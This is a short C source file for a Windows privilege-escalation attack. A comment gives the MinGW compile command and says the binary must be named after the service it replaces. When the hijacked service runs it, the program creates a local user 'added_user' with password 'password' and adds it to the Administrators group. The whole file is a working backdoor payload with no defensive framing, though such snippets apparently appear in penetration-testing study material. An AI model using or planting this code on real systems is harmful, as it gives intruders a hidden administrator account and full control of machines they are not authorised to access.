// x86_64-w64-mingw32-gcc adduser.c -o <service-binary-name>
// THE COMPILED EXPLOIT MUST BE NAMED THE SAME AS THE SERVICE IT IS REPLACING!
#include <stdlib.h>

int main() {
	int i;

	i = system("net user added_user password /add");
	i = system("net localgroup Administrators added_user /add");

	return 0;
}

